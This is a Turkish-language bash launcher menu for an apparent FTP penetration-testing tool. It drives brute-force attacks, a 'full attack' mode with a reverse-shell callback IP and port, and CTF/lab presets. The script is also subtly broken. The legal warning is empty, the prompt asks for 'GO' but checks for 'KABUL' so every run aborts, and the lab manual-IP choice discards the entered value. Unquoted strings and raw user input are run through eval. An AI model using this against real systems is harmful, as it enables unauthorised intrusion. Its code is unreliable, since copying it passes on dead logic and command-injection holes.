#!/bin/bash
# Renkler
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     FTP PenTest Framework - Quick Start                      ║
║                                                               ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Yasal Uyarı
echo -e "${RED}═══════════════════════════════════════════════════════════════"            
echo -e "═══════════════════════════════════════════════════════════════${NC}"

read -p "Devam etmek için 'GO' yazın: " accept

if [ "$accept" != "KABUL" ]; then
    echo -e "${RED}İşlem iptal edildi.${NC}"
    exit 1
fi

echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}Hangi senaryoyu kullanmak istersiniz?${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo "1) Temel Tarama (Anonymous Login)"
echo "2) Credential ile Tarama"
echo "3) Brute Force Saldırısı"
echo "4) Tam Özellikli Saldırı"
echo "5) Sadece Zafiyet Taraması"
echo "6) Manuel Hedef Girişi"
echo "7) CTF/Lab Ortamı Özel Ayarlar"
echo "8) Çıkış"
echo ""
read -p "Seçiminiz (1-8): " choice

case $choice in
    1)
        echo -e "${BLUE}[*] Temel Tarama Modu${NC}"
        read -p "Hedef IP: " target
        
        echo -e "${GREEN}[+] Komut çalıştırılıyor...${NC}"
        python3 FTPVulnScanner.py -t "$target" -v
        ;;
        
    2)
        echo -e "${BLUE}[*] Credential ile Tarama Modu${NC}"
        read -p "Hedef IP: " target
        read -p "Kullanıcı adı: " username
        read -sp "Şifre: " password
        echo ""
        
        echo -e "${GREEN}[+] Komut çalıştırılıyor...${NC}"
        python3 FTPVulnScanner.py -t "$target" -u "$username" -pw "$password" -v
        ;;
        
    3)
        echo -e "${BLUE}[*] Brute Force Saldırısı Modu${NC}"
        read -p "Hedef IP: " target
        
        echo -e "${YELLOW}[!] Bu işlem zaman alabilir ve hedef sistemde log bırakır!${NC}"
        read -p "Devam edilsin mi? (y/n): " confirm
        
        if [ "$confirm" = "y" ]; then
            echo -e "${GREEN}[+] Komut çalıştırılıyor...${NC}"
            python3 FTPVulnScanner.py -t "$target" --brute-force -v
        else
            echo -e "${RED}İşlem iptal edildi.${NC}"
        fi
        ;;
        
    4)
        echo -e "${BLUE}[*] Tam Özellikli Saldırı Modu${NC}"
        read -p "Hedef IP: " target
        read -p "Hedef Port (default: 21): " port
        port=${port:-21}
        
        read -p "Reverse Shell IP (boş bırakın otomatik tespit için): " reverse_ip
        read -p "Reverse Shell Port (default: 4444): " reverse_port
        reverse_port=${reverse_port:-4444}
        
        read -p "FTP Kullanıcı adı (default: anonymous): " username
        username=${username:-anonymous}
        
        read -sp "FTP Şifre (default: anonymous): " password
        password=${password:-anonymous}
        echo ""
        
        read -p "Brute force etkinleştirilsin mi? (y/n): " brute
        
        cmd="python3 FTPVulnScanner.py -t $target -p $port"
        
        if [ ! -z "$reverse_ip" ]; then
            cmd="$cmd -r $reverse_ip"
        fi
        
        cmd="$cmd -rp $reverse_port -u $username -pw $password"
        
        if [ "$brute" = "y" ]; then
            cmd="$cmd --brute-force"
        fi
        
        cmd="$cmd -v"
        
        echo -e "${GREEN}[+] Komut çalıştırılıyor...${NC}"
        echo -e "${BLUE}$cmd${NC}"
        eval $cmd
        ;;
        
    5)
        echo -e "${BLUE}[*] Sadece Zafiyet Taraması Modu${NC}"
        read -p "Hedef IP: " target
        
        echo -e "${GREEN}[+] Komut çalıştırılıyor (exploitation devre dışı)...${NC}"
        python3 FTPVulnScanner.py -t "$target" --no-listener -v
        ;;
        
    6)
        echo -e "${BLUE}[*] Manuel Hedef Girişi${NC}"
        read -p "Tam komutu girin: " manual_cmd
        
        echo -e "${GREEN}[+] Komut çalıştırılıyor...${NC}"
        eval "$manual_cmd"
        ;;
        
    7)
        echo -e "${BLUE}[*] CTF/Lab Özel Ayarlar${NC}"
        
        echo ""
        echo "Yaygın CTF/Lab Hedefleri:"
        echo "1) 10.0.2.* (VirtualBox Host-Only)"
        echo "2) 192.168.56.* (VirtualBox Internal)"
        echo "3) 192.168.1.* (Yerel Ağ)"
        echo "4) Manuel Giriş"
        echo ""
        read -p "Seçim: " lab_choice
        
        case $lab_choice in
            1) target_base="10.0.2." ;;
            2) target_base="192.168.56." ;;
            3) target_base="192.168.1." ;;
            4) read -p "Hedef IP: " target_base
               target_base=""
               ;;
        esac
        
        if [ ! -z "$target_base" ]; then
            read -p "Son oktet (örn: 33): " last_octet
            target="${target_base}${last_octet}"
        fi
        
        echo ""
        echo -e "${YELLOW}CTF/Lab için önerilen ayarlar:${NC}"
        echo "- Anonymous login denemesi"
        echo "- Brute force etkin"
        echo "- Verbose mode"
        echo "- Otomatik reverse shell listener"
        echo ""
        
        echo -e "${GREEN}[+] Komut çalıştırılıyor...${NC}"
        python3 FTPVulnScanner.py -t "$target" --brute-force -v
        ;;
        
    8)
        echo -e "${GREEN}Çıkış yapılıyor...${NC}"
        exit 0
        ;;
        
    *)
        echo -e "${RED}Geçersiz seçim!${NC}"
        exit 1
        ;;
esac

echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}İşlem tamamlandı!${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Oluşturulan dosyalar:"
ls -lh ftp_pentest*.log 2>/dev/null
ls -lh ftp_pentest_report*.txt 2>/dev/null
ls -lh ftp_pentest_report*.json 2>/dev/null
ls -lh post_exploit_guide*.txt 2>/dev/null
echo ""
echo -e "${BLUE}Rapor ve logları inceleyebilirsiniz.${NC}"
